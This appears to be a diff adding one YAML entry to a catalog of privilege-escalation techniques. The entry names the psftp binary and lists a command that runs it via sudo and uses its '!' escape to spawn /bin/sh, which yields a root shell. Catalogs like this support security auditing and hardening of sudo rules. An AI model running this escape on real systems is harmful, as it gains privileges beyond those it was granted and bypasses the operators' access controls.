@@ -1,0 +1,4 @@
+name: psftp
+binary_path: /usr/bin/psftp
+exploit_cmds:
+- sudo /usr/bin/psftp && !/bin/sh
